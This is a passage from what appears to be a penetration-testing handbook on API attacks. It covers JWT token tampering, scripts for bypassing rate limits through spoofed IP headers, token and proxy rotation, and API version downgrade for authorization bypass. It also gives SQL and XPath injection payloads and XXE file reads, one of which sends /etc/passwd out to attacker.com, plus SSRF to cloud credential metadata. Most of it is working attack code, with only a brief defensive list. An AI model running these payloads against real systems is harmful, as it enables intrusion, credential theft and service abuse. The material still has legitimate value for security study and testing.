            print(f"  [!] VULN: Accessible without auth")
        
        # Test 2: Modified claims
        modifications = [
            {'role': 'admin'},
            {'is_admin': True},
            {'user_id': 1},
            {'exp': 9999999999}
        ]
        for mod in modifications:
            result = self.test_modified_token(endpoint, valid_token, mod)
            all_results.append(result)
            if result.get('vulnerable'):
                print(f"  [!] VULN: Accepts modified token - {mod}")
        
        # Test 3: JWT algorithm attacks
        results = self.test_jwt_algorithms(endpoint, valid_token)
        all_results.extend(results)
        for r in results:
            if r.get('vulnerable'):
                print(f"  [!] VULN: {r['attack']}")
    
    return all_results

if **name** == "**main**": tester = AuthTester("https://target.com")

endpoints = [
    "/api/v1/users",
    "/api/v1/admin",
    "/api/v1/profile"
]

valid_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

results = tester.run_full_test(endpoints, valid_token)

# Export results
with open('auth_test_results.json', 'w') as f:
    json.dump(results, f, indent=2)
````

**API authentication header fuzzing:**
```bash
# Test various authentication header names
cat > auth_headers.txt <<EOF
Authorization
X-API-Key
X-Auth-Token
X-Access-Token
Api-Key
Token
X-Token
Access-Token
Auth-Token
Bearer
X-Authorization
API-KEY
api_key
apikey
EOF

# Fuzz with ffuf
ffuf -u http://target.com/api/v1/admin \
  -w auth_headers.txt:HEADER \
  -H "HEADER: Bearer TOKEN" \
  -mc 200,201,204

# Test case variations
for header in "Authorization" "authorization" "AUTHORIZATION"; do
  curl http://target.com/api/v1/admin \
    -H "$header: Bearer TOKEN" -v
done
````

---

## API Rate Limiting Bypass

### Rate Limiting Basics

**Common rate limiting implementations:**

- IP-based: Limits requests per IP address
- User-based: Limits requests per authenticated user
- API key-based: Limits requests per API key
- Endpoint-specific: Different limits for different endpoints
- Global: Overall request limit across all endpoints

**Identifying rate limits:**

```bash
# Look for rate limit headers
curl -I http://target.com/api/v1/endpoint

# Common headers:
# X-RateLimit-Limit: 100
# X-RateLimit-Remaining: 99
# X-RateLimit-Reset: 1634567890
# Retry-After: 60
# X-Rate-Limit-Reset: 2021-10-18T12:00:00Z

# Test rate limiting
for i in {1..200}; do
  curl http://target.com/api/v1/endpoint \
    -H "Authorization: Bearer TOKEN" \
    -s -o /dev/null -w "%{http_code}\n"
  sleep 0.1
done

# Watch for 429 (Too Many Requests) or 403 responses
```

### Rate Limiting Bypass Techniques

**1. IP Address Rotation:**

**Using X-Forwarded-For header:**

```bash
# Bypass IP-based rate limiting
for i in {1..100}; do
  curl http://target.com/api/v1/endpoint \
    -H "X-Forwarded-For: 192.168.1.$i" \
    -s -o /dev/null -w "%{http_code}\n"
done

# Try various headers
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Remote-Addr: 1.2.3.4
CF-Connecting-IP: 1.2.3.4  # Cloudflare
True-Client-IP: 1.2.3.4     # Akamai/CloudFlare
X-Client-IP: 1.2.3.4
Client-IP: 1.2.3.4
Forwarded: for=1.2.3.4
```

**Multiple IP header injection:**

```bash
# Some parsers only check first IP
curl http://target.com/api/v1/endpoint \
  -H "X-Forwarded-For: 1.2.3.4, 5.6.7.8"

# Or last IP
curl http://target.com/api/v1/endpoint \
  -H "X-Forwarded-For: 127.0.0.1, 192.168.1.100"

# IPv6 addresses
curl http://target.com/api/v1/endpoint \
  -H "X-Forwarded-For: ::1"

curl http://target.com/api/v1/endpoint \
  -H "X-Forwarded-For: 2001:db8::1"
```

**Using VPN/Proxy rotation:**

```bash
# With proxychains (configure multiple proxies)
proxychains4 curl http://target.com/api/v1/endpoint

# With Tor
torify curl http://target.com/api/v1/endpoint

# Or change Tor circuit between requests
killall -HUP tor

# Using proxy list
while read proxy; do
  curl http://target.com/api/v1/endpoint \
    -x "$proxy" \
    -H "Authorization: Bearer TOKEN"
  sleep 1
done < proxy_list.txt
```

**2. User Agent Rotation:**

```bash
# Some systems rate limit by User-Agent
cat > user_agents.txt <<EOF
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)
curl/7.68.0
python-requests/2.26.0
PostmanRuntime/7.28.4
EOF

while read ua; do
  curl http://target.com/api/v1/endpoint \
    -H "User-Agent: $ua" \
    -H "Authorization: Bearer TOKEN"
done < user_agents.txt
```

**3. Session/Token Rotation:**

```bash
# Use multiple API keys/tokens
cat > tokens.txt <<EOF
token_1_here
token_2_here
token_3_here
EOF

# Round-robin through tokens
token_array=($(cat tokens.txt))
total_tokens=${#token_array[@]}

for i in {1..1000}; do
  token=${token_array[$((i % total_tokens))]}
  curl http://target.com/api/v1/endpoint \
    -H "Authorization: Bearer $token"
done

# Create multiple accounts for different tokens
# [Inference] Violates terms of service of most platforms
```

**4. Parameter Pollution:**

```bash
# Confuse rate limiting logic with duplicate parameters
curl "http://target.com/api/v1/search?q=test&q=test&q=test"

# Parameter casing variations
curl "http://target.com/api/v1/endpoint?userid=123"
curl "http://target.com/api/v1/endpoint?userId=123"
curl "http://target.com/api/v1/endpoint?USERID=123"
curl "http://target.com/api/v1/endpoint?UserId=123"

# Adding null bytes
curl "http://target.com/api/v1/endpoint?user%00id=123"

# Unicode variations
curl "http://target.com/api/v1/endpoint?useï½’id=123"
```

**5. Endpoint Path Manipulation:**

```bash
# Rate limiting may only apply to specific path formats

# Original endpoint
curl http://target.com/api/v1/users/123

# Try variations
curl http://target.com/api/v1/users/123/
curl http://target.com/api/v1/users/123//
curl http://target.com/api/v1/users//123
curl http://target.com/api/v1/./users/123
curl http://target.com/api/v1/users/./123
curl http://target.com/api/v1/users/../users/123

# Case sensitivity
curl http://target.com/api/v1/Users/123
curl http://target.com/API/v1/users/123

# Extension addition
curl http://target.com/api/v1/users/123.json
curl http://target.com/api/v1/users/123.xml

# Query string addition (if ignored)
curl http://target.com/api/v1/users/123?random=value
```

**6. HTTP Method Variation:**

```bash
# Rate limiting might only apply to specific methods
# If GET is rate limited, try:
curl -X POST http://target.com/api/v1/endpoint
curl -X HEAD http://target.com/api/v1/endpoint
curl -X OPTIONS http://target.com/api/v1/endpoint

# Method override headers
curl -X GET http://target.com/api/v1/endpoint \
  -H "X-HTTP-Method-Override: POST"

curl -X GET http://target.com/api/v1/endpoint \
  -H "X-Method-Override: POST"
```

**7. Race Conditions:**

```bash
# Send multiple requests simultaneously before rate limit kicks in

# Using GNU parallel
seq 1 100 | parallel -j 100 curl http://target.com/api/v1/endpoint -H "Authorization: Bearer TOKEN"

# Using xargs
seq 1 100 | xargs -P 100 -I {} curl http://target.com/api/v1/endpoint -H "Authorization: Bearer TOKEN"

# Python script for precise timing
cat > race_condition.py <<'EOF'
import requests
import threading

def make_request():
    resp = requests.get(
        'http://target.com/api/v1/endpoint',
        headers={'Authorization': 'Bearer TOKEN'}
    )
    print(f"Status: {resp.status_code}")

threads = []
for i in range(100):
    t = threading.Thread(target=make_request)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
EOF

python3 race_condition.py
```

**8. Request Smuggling/Splitting:**

```bash
# Manipulate Content-Length to smuggle multiple requests
# [Inference] Depends on specific server configuration

curl http://target.com/api/v1/endpoint \
  -H "Content-Length: 50" \
  -H "Transfer-Encoding: chunked" \
  -d "GET /api/v1/another HTTP/1.1\r\nHost: target.com\r\n\r\n"

# CRLF injection in headers
curl http://target.com/api/v1/endpoint \
  -H $'User-Agent: test\r\nX-Forwarded-For: 1.2.3.4'
```

**9. Cache Poisoning:**

```bash
# Poison cache to serve unlimited responses
curl http://target.com/api/v1/endpoint \
  -H "X-Forwarded-Host: attacker.com" \
  -H "X-Original-URL: /different/endpoint"

# Cache key manipulation
curl http://target.com/api/v1/endpoint?cachebuster=$RANDOM

# Vary header exploitation
# [Inference] Requires understanding of cache behavior
```

**10. Encoding Variations:**

```bash
# URL encoding
curl "http://target.com/api/v1/%75%73%65%72%73/123"

# Double encoding
curl "http://target.com/api/v1/%2575%2573%2565%2572%2573/123"

# Unicode encoding
curl "http://target.com/api/v1/\u0075sers/123"

# Mixed encoding
curl "http://target.com/api/v1/us%65rs/123"
```

### Bypassing Advanced Rate Limiting

**GraphQL query complexity bypass:**

```bash
# GraphQL APIs may limit by query complexity
# Bypass by reducing complexity while maintaining data extraction

# High complexity (may be blocked)
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ users { id name email posts { title comments { text } } } }"
  }'

# Lower complexity (multiple requests)
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users { id } }"}'

curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { email posts { title } } }"}'

# Alias abuse to multiply queries
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ 
      user1: user(id: 1) { name }
      user2: user(id: 2) { name }
      user3: user(id: 3) { name }
    }"
  }'
```

**WebSocket bypass:**

```bash
# If REST API has rate limiting but WebSocket doesn't
# Connect via WebSocket and send API commands

# Using wscat
npm install -g wscat
wscat -c ws://target.com/api/socket \
  -H "Authorization: Bearer TOKEN"

# Once connected, send JSON messages
> {"action": "getUsers", "limit": 100}
> {"action": "getUsers", "limit": 100}  # No rate limit

# Python WebSocket client
cat > ws_bypass.py <<'EOF'
import websocket
import json

def on_message(ws, message):
    print(f"Received: {message}")

def on_open(ws):
    for i in range(1000):  # Send many requests
        ws.send(json.dumps({"action": "getData", "id": i}))

ws = websocket.WebSocketApp(
    "ws://target.com/api/socket",
    header={"Authorization": "Bearer TOKEN"},
    on_message=on_message,
    on_open=on_open
)

ws.run_forever()
EOF

python3 ws_bypass.py
```

**Origin/Referer manipulation:**

```bash
# Rate limiting might trust certain origins
curl http://target.com/api/v1/endpoint \
  -H "Origin: https://target.com" \
  -H "Referer: https://target.com/trusted-page"

# Try internal origins
curl http://target.com/api/v1/endpoint \
  -H "Origin: http://localhost" \
  -H "Referer: http://127.0.0.1"

# Mobile app origins
curl http://target.com/api/v1/endpoint \
  -H "Origin: app://com.target.mobile"
```

**Time-based bypass:**

```bash
# Exploit reset window timing
# If rate limit resets every 60 seconds

# Burst requests at reset time
while true; do
  # Wait for reset (check X-RateLimit-Reset header)
  sleep $((RESET_TIME - $(date +%s)))
  
  # Burst requests
  for i in {1..100}; do
    curl http://target.com/api/v1/endpoint \
      -H "Authorization: Bearer TOKEN" &
  done
  wait
done
```

### Automation Tools

**Custom rate limit bypass script:**

```python
#!/usr/bin/env python3
# rate_limit_bypass.py
import requests
import random
import time
from concurrent.futures import ThreadPoolExecutor
from itertools import cycle

class RateLimitBypass:
    def __init__(self, url, tokens=None):
        self.url = url
        self.tokens = tokens or ['default_token']
        self.token_cycle = cycle(self.tokens)
        
        # List of common forwarding headers
        self.ip_headers = [
            'X-Forwarded-For',
            'X-Real-IP',
            'X-Originating-IP',
            'X-Remote-IP',
            'CF-Connecting-IP',
            'True-Client-IP'
        ]
        
        # User agents
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'curl/7.68.0',
            'python-requests/2.26.0'
        ]
    
    def generate_ip(self):
        """Generate random IP address"""
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    def make_request_with_bypass(self, method='GET', data=None):
        """Make request with multiple bypass techniques"""
        headers = {
            'Authorization': f'Bearer {next(self.token_cycle)}',
            'User-Agent': random.choice(self.user_agents)
        }
        
        # Add random IP forwarding header
        header_name = random.choice(self.ip_headers)
        headers[header_name] = self.generate_ip()
        
        # Add random query parameter to vary cache key
        url = f"{self.url}?_cb={random.randint(1, 999999)}"
        
        try:
            if method == 'GET':
                resp = requests.get(url, headers=headers, timeout=10)
            elif method == 'POST':
                resp = requests.post(url, headers=headers, json=data, timeout=10)
            
            return {
                'status': resp.status_code,
                'headers': dict(resp.headers),
                'limited': resp.status_code == 429,
                'success': resp.status_code == 200
            }
        except Exception as e:
            return {'error': str(e)}
    
    def bypass_test(self, requests_count=100, threads=10):
        """Test rate limit bypass"""
        results = {'success': 0, 'limited': 0, 'errors': 0}
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [
                executor.submit(self.make_request_with_bypass)
                for _ in range(requests_count)
            ]
            
            for future in futures:
                result = future.result()
                if result.get('success'):
                    results['success'] += 1
                elif result.get('limited'):
                    results['limited'] += 1
                else:
                    results['errors'] += 1
                
                # Check rate limit headers
                if 'headers' in result:
                    rl_remaining = result['headers'].get('X-RateLimit-Remaining')
                    if rl_remaining:
                        print(f"Remaining: {rl_remaining}")
        
        print(f"\n[+] Results:")
        print(f"    Success: {results['success']}")
        print(f"    Limited: {results['limited']}")
        print(f"    Errors: {results['errors']}")
        print(f"    Bypass rate: {(results['success']/requests_count)*100:.2f}%")
        
        return results

if __name__ == "__main__":
    # Multiple tokens/API keys
    tokens = [
        'token_1',
        'token_2',
        'token_3'
    ]
    
    bypasser = RateLimitBypass(
        'https://target.com/api/v1/endpoint',
        tokens=tokens
    )
    
    # Run bypass test
    bypasser.bypass_test(requests_count=200, threads=20)
```

**Using Burp Intruder with pitchfork attack:**

```bash
# Setup in Burp Intruder:
# 1. Mark token position: Authorization: Bearer Â§tokenÂ§
# 2. Mark IP position: X-Forwarded-For: Â§ipÂ§
# 3. Attack type: Pitchfork
# 4. Load token list into first payload set
# 5. Load IP list into second payload set
# 6. Start attack

# Payloads rotate together, distributing requests across tokens and IPs
```

**HTTP/2 multiplexing bypass:**

```bash
# HTTP/2 allows multiple requests over single connection
# May bypass connection-based rate limiting

# Using curl with HTTP/2
curl --http2 http://target.com/api/v1/endpoint \
  -H "Authorization: Bearer TOKEN"

# Send multiple requests on same connection
# [Inference] Requires h2 protocol support and specific server configuration
```

### Rate Limiting Best Practices (Defensive)

**For penetration testing reports:**

- IP-based limiting should validate X-Forwarded-For carefully
- Implement token bucket or leaky bucket algorithms
- Use distributed rate limiting (Redis, Memcached)
- Apply limits at multiple levels (IP, user, API key, endpoint)
- Include jitter in rate limit calculations
- Log and alert on bypass attempts
- Implement progressive delays (exponential backoff)
- Use CAPTCHA for suspicious patterns

---

## Important Related Topics

**API Security Standards:**

- OWASP API Security Top 10
- OAuth 2.0 and OpenID Connect security
- API Gateway security configurations
- JWT best practices and common pitfalls

**Advanced API Testing:**

- GraphQL-specific vulnerabilities (batching attacks, introspection abuse)
- gRPC and Protocol Buffer exploitation
- SOAP API security testing
- WebSocket security issues

**Business Logic Flaws:**

- Insufficient purchase flow validation
- Negative quantity/price manipulation
- Coupon/discount abuse
- Resource exhaustion attacks

---

## API Versioning Exploitation

API versioning allows developers to maintain backward compatibility while evolving functionality. Older API versions often contain security vulnerabilities that were patched in newer versions but remain accessible.

### Reconnaissance and Version Discovery

**Identifying API Versions**

```bash
# Common version patterns in URLs
curl -i https://target.com/api/v1/users
curl -i https://target.com/api/v2/users
curl -i https://target.com/api/version1/users
curl -i https://target.com/v1.0/api/users

# Version in headers
curl -i https://target.com/api/users \
  -H "API-Version: 1"
  
curl -i https://target.com/api/users \
  -H "Accept: application/vnd.company.v1+json"

# Version in query parameters
curl -i "https://target.com/api/users?version=1"
curl -i "https://target.com/api/users?api_version=1.0"

# Version in subdomain
curl -i https://api-v1.target.com/users
curl -i https://v2.api.target.com/users
```

**Automated Version Enumeration**

```bash
# ffuf - URL path fuzzing
ffuf -u https://target.com/api/FUZZ/users \
  -w <(seq 1 10 | sed 's/^/v/') \
  -mc 200,201,301,302,401,403 \
  -o version_discovery.json

# Alternative version formats
cat > version_wordlist.txt << EOF
v1
v2
v3
v1.0
v1.1
v2.0
version1
version2
api/v1
api/v2
1.0
2.0
EOF

ffuf -u https://target.com/FUZZ/users \
  -w version_wordlist.txt \
  -mc all -fc 404

# Header-based version discovery with Burp Intruder
# Send request to Intruder
# Add payload position: API-Version: Â§1Â§
# Payload type: Numbers (1-20)
```

**Automated API Discovery Tools**

```bash
# Amass - Subdomain enumeration for API endpoints
amass enum -d target.com -o subdomains.txt
grep -E "api|v[0-9]" subdomains.txt

# arjun - Parameter discovery including version parameters
arjun -u https://target.com/api/users \
  --get \
  --stable

# kiterunner - API endpoint and version discovery
kr scan https://target.com -w routes-large.kite \
  -x 20 \
  --fail-status-codes 404 \
  -o kr_results.txt

# Download kiterunner wordlists
wget https://github.com/assetnote/wordlists/raw/master/data/kiterunner-routes.txt
```

### Version-Specific Vulnerabilities

**Testing Authentication Differences**

```bash
# Test if older versions have weaker/missing authentication
# v2 (current) - requires Bearer token
curl -i https://target.com/api/v2/users/123 \
  -H "Authorization: Bearer token_here"

# v1 (legacy) - test without authentication
curl -i https://target.com/api/v1/users/123

# Test with only API key (weaker than OAuth)
curl -i https://target.com/api/v1/users/123?api_key=public_key

# Test basic auth on old versions
curl -i https://target.com/api/v1/users/123 \
  -u "username:password"
```

**Authorization Bypass via Version Downgrade**

```python
#!/usr/bin/env python3
# version_authz_test.py

import requests

base_url = "https://target.com/api"
versions = ['v1', 'v2', 'v3', 'v1.0', 'v1.1', 'v2.0']
sensitive_endpoints = ['/admin/users', '/users/delete', '/config', '/internal']

headers = {
    "Authorization": "Bearer low_privilege_token"
}

print("[*] Testing authorization across API versions\n")

for version in versions:
    for endpoint in sensitive_endpoints:
        url = f"{base_url}/{version}{endpoint}"
        try:
            response = requests.get(url, headers=headers, timeout=5)
            if response.status_code == 200:
                print(f"[+] SUCCESS: {url} - Status: {response.status_code}")
                print(f"    Response length: {len(response.text)} bytes")
            elif response.status_code == 403:
                print(f"[-] Forbidden: {url}")
            elif response.status_code == 401:
                print(f"[-] Unauthorized: {url}")
        except Exception as e:
            print(f"[!] Error testing {url}: {str(e)}")
```

**Deprecated Feature Exploitation**

```bash
# Old versions may have deprecated features with vulnerabilities

# Test for mass assignment in v1 (patched in v2)
curl -X POST https://target.com/api/v1/users \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "email": "attacker@evil.com",
    "is_admin": true,
    "role": "administrator"
  }'

# Compare with v2 (properly filters parameters)
curl -X POST https://target.com/api/v2/users \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "email": "attacker@evil.com",
    "is_admin": true,
    "role": "administrator"
  }'

# Test for IDOR in older versions
for user_id in {1..100}; do
  curl -s https://target.com/api/v1/users/$user_id \
    -H "Authorization: Bearer token" | \
    grep -q "email" && echo "[+] IDOR: User $user_id accessible"
done
```

### Version-Specific Input Validation

```bash
# Older versions may have weaker input validation

# Test injection payloads on different versions
payloads=(
  "' OR '1'='1"
  "admin'--"
  "../../../etc/passwd"
  "<script>alert(1)</script>"
  "${7*7}"
)

for version in v1 v2 v3; do
  echo "[*] Testing version: $version"
  for payload in "${payloads[@]}"; do
    response=$(curl -s https://target.com/api/$version/search?q="$payload")
    echo "Payload: $payload"
    echo "Response: ${response:0:100}"
    echo "---"
  done
done
```

### Rate Limiting and Security Control Differences

```bash
# Test if old versions have missing/weaker rate limits

# v2 rate limiting test (current)
for i in {1..100}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    https://target.com/api/v2/users \
    -H "Authorization: Bearer token"
done | sort | uniq -c

# v1 rate limiting test (legacy)
for i in {1..100}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    https://target.com/api/v1/users \
    -H "Authorization: Bearer token"
done | sort | uniq -c

# Expect to see 429 (Too Many Requests) on v2 but possibly not on v1
```

**Automated Rate Limit Testing**

```python
#!/usr/bin/env python3
# rate_limit_comparison.py

import requests
import time
from collections import Counter

def test_rate_limit(url, num_requests=100):
    status_codes = []
    start_time = time.time()
    
    for i in range(num_requests):
        try:
            response = requests.get(url, timeout=5)
            status_codes.append(response.status_code)
        except Exception as e:
            status_codes.append('ERROR')
    
    elapsed = time.time() - start_time
    return Counter(status_codes), elapsed

versions = ['v1', 'v2', 'v3']
base_url = "https://target.com/api"

for version in versions:
    url = f"{base_url}/{version}/users"
    print(f"\n[*] Testing {version}")
    results, elapsed = test_rate_limit(url)
    print(f"    Time: {elapsed:.2f}s")
    print(f"    Results: {dict(results)}")
    
    if 429 not in results:
        print(f"    [!] No rate limiting detected on {version}")
```

### Tools & Commands

```bash
# Postman/Newman - API collection testing across versions
# Create collection with version variables
newman run api_collection.json \
  --env-var "api_version=v1" \
  --reporters cli,json

newman run api_collection.json \
  --env-var "api_version=v2" \
  --reporters cli,json

# Diff the results
diff v1_results.json v2_results.json

# OWASP ZAP - API scanning with version fuzzing
zap-cli start --start-options '-config api.key=YOURAPIKEY'
zap-cli open-url https://target.com/api/v1
zap-cli spider https://target.com/api/v1
zap-cli active-scan https://target.com/api/v1
zap-cli report -o zap_report_v1.html -f html

# Compare scanning results across versions
```

## SOAP Injection

SOAP (Simple Object Access Protocol) uses XML for message formatting and is vulnerable to XML-based injection attacks. Many legacy enterprise applications still use SOAP APIs.

### SOAP Reconnaissance

**Discovering SOAP Endpoints**

```bash
# Common SOAP endpoint paths
curl -i https://target.com/soap
curl -i https://target.com/services
curl -i https://target.com/ws
curl -i https://target.com/webservices
curl -i https://target.com/api/soap
curl -i https://target.com/Service.asmx
curl -i https://target.com/Service.svc

# Check for WSDL (Web Services Description Language)
curl -i "https://target.com/service?wsdl"
curl -i "https://target.com/service.asmx?wsdl"
curl -i "https://target.com/soap?wsdl"

# Download and parse WSDL
curl "https://target.com/service?wsdl" -o service.wsdl

# Extract operations from WSDL
grep -Eo '<operation name="[^"]+"' service.wsdl | cut -d'"' -f2
```

**WSDL Analysis Tools**

```bash
# wsdler - WSDL parser and enumerator
git clone https://github.com/ernw/WSDLer
cd WSDLer
python wsdler.py -u "https://target.com/service?wsdl"

# SoapUI (GUI tool) - Import WSDL for testing
# Command-line alternative: soapui-cli
sh /opt/SoapUI/bin/testrunner.sh \
  -s"ServiceTestSuite" \
  -c"TestCase1" \
  project.xml

# Manual WSDL enumeration
curl -s "https://target.com/service?wsdl" | \
  grep -Eo 'name="[^"]+"' | sort -u
```

### SOAP Message Structure

**Basic SOAP Request Template**

```xml
POST /service.asmx HTTP/1.1
Host: target.com
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://target.com/GetUser"
Content-Length: 350

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <soap:Body>
    <GetUser xmlns="http://target.com/">
      <userId>123</userId>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

### XML Injection in SOAP

**SQL Injection via SOAP Parameters**

```bash
# Test SQLi in SOAP parameters
cat > soap_sqli_test.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser xmlns="http://target.com/">
      <userId>1' OR '1'='1</userId>
    </GetUser>
  </soap:Body>
</soap:Envelope>
EOF

curl -X POST https://target.com/service.asmx \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"http://target.com/GetUser\"" \
  -d @soap_sqli_test.xml

# Blind SQLi time-based payload
cat > soap_sqli_time.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser xmlns="http://target.com/">
      <userId>1' AND SLEEP(5)--</userId>
    </GetUser>
  </soap:Body>
</soap:Envelope>
EOF

time curl -X POST https://target.com/service.asmx \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"http://target.com/GetUser\"" \
  -d @soap_sqli_time.xml
```

**XPath Injection**

[Inference] SOAP services often use XPath to query XML data structures. XPath injection allows attackers to bypass authentication or extract sensitive data.

```xml
<!-- Normal authentication request -->
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Login xmlns="http://target.com/">
      <username>admin</username>
      <password>password123</password>
    </Login>
  </soap:Body>
</soap:Envelope>

<!-- XPath injection bypass -->
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Login xmlns="http://target.com/">
      <username>admin' or '1'='1</username>
      <password>anything</password>
    </Login>
  </soap:Body>
</soap:Envelope>

<!-- XPath data extraction -->
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Login xmlns="http://target.com/">
      <username>' or 1=1]/*[1] | //*[contains(local-name(),'password')]/*['</username>
      <password>x</password>
    </Login>
  </soap:Body>
</soap:Envelope>
```

**Testing Script for XPath Injection**

```python
#!/usr/bin/env python3
# soap_xpath_injection.py

import requests
import time

url = "https://target.com/service.asmx"
headers = {
    "Content-Type": "text/xml; charset=utf-8",
    "SOAPAction": '"http://target.com/Login"'
}

xpath_payloads = [
    "admin' or '1'='1",
    "admin' or '1'='1' or '1'='1",
    "' or 1=1 or ''='",
    "admin'--",
    "' or '1'='1",
    "1' or '1' = '1",
    "' or 1=1--",
    "admin' or '1'='1'/*",
]

soap_template = """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Login xmlns="http://target.com/">
      <username>{username}</username>
      <password>test123</password>
    </Login>
  </soap:Body>
</soap:Envelope>"""

print("[*] Testing XPath injection payloads\n")

for payload in xpath_payloads:
    soap_body = soap_template.format(username=payload)
    
    try:
        response = requests.post(url, headers=headers, data=soap_body, timeout=10)
        
        # Check for successful authentication indicators
        if any(indicator in response.text.lower() for indicator in 
               ['success', 'authenticated', 'token', 'session']):
            print(f"[+] POTENTIAL VULNERABILITY")
            print(f"    Payload: {payload}")
            print(f"    Status: {response.status_code}")
            print(f"    Response snippet: {response.text[:200]}")
            print()
        else:
            print(f"[-] No injection: {payload[:50]}")
            
    except Exception as e:
        print(f"[!] Error with payload {payload}: {str(e)}")
    
    time.sleep(1)  # Avoid rate limiting
```

### XML External Entity (XXE) Injection

XXE vulnerabilities in SOAP allow attackers to read local files, perform SSRF, or cause denial of service.

**Basic XXE Payload**

```xml
POST /service.asmx HTTP/1.1
Host: target.com
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://target.com/ProcessData"

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ProcessData xmlns="http://target.com/">
      <data>&xxe;</data>
    </ProcessData>
  </soap:Body>
</soap:Envelope>
```

**XXE File Exfiltration**

```bash
# Linux file reading
cat > xxe_linux.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ProcessData xmlns="http://target.com/">
      <data>&xxe;</data>
    </ProcessData>
  </soap:Body>
</soap:Envelope>
EOF

curl -X POST https://target.com/service.asmx \
  -H "Content-Type: text/xml" \
  -H "SOAPAction: \"http://target.com/ProcessData\"" \
  -d @xxe_linux.xml

# Windows file reading
cat > xxe_windows.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ProcessData xmlns="http://target.com/">
      <data>&xxe;</data>
    </ProcessData>
  </soap:Body>
</soap:Envelope>
EOF

curl -X POST https://target.com/service.asmx \
  -H "Content-Type: text/xml" \
  -H "SOAPAction: \"http://target.com/ProcessData\"" \
  -d @xxe_windows.xml
```

**Out-of-Band XXE (OOB-XXE)**

```bash
# Setup listener on attacker server
# On attacker machine (example.com):
sudo nc -lvnp 80

# Or use python HTTP server
python3 -m http.server 80

# SOAP request with OOB XXE
cat > xxe_oob.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
  %param1;
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ProcessData xmlns="http://target.com/">
      <data>&exfil;</data>
    </ProcessData>
  </soap:Body>
</soap:Envelope>
EOF

# Create DTD file on attacker server (xxe.dtd)
cat > xxe.dtd << 'EOF'
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%data;'>">
EOF

# Serve the DTD
python3 -m http.server 80 &

# Send SOAP request
curl -X POST https://target.com/service.asmx \
  -H "Content-Type: text/xml" \
  -H "SOAPAction: \"http://target.com/ProcessData\"" \
  -d @xxe_oob.xml
```

**XXE for SSRF**

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ProcessData xmlns="http://target.com/">
      <data>&xxe;</data>
    </ProcessData>
  </soap:Body>
</soap:Envelope>
```

